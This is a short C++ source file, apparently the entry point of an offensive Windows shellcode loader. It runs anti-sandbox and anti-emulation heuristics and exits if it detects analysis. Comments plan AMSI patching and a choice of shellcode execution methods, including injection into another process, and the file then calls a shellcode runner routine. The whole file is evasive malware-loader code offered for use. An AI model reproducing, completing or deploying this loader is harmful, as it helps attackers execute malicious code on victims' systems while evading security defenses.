#include <Windows.h>
#include "Runners.h"
#include "Heuristics.h"

// Add arguments to select preferred shellcode running method, add heuristics, amsi patching 
int main(void)
{
	// check arguments (max 1)

	// call heuristic functions
	if ((heuristic::Heuristic::CheckSleep()) || (heuristic::Heuristic::NoEmulate()))
	{
		return 0;
	}
	
		
	// patch amsi

	// determine function to call based on argument provided, case insensitive

	//netrunners::Runner::Run();
	//netrunners::Runner::piRun(); // note: if target process is a GUI program, use windows app shellcode to avoid crashing
	runner::Runner::epsRun(); 
	
	return 0;
}
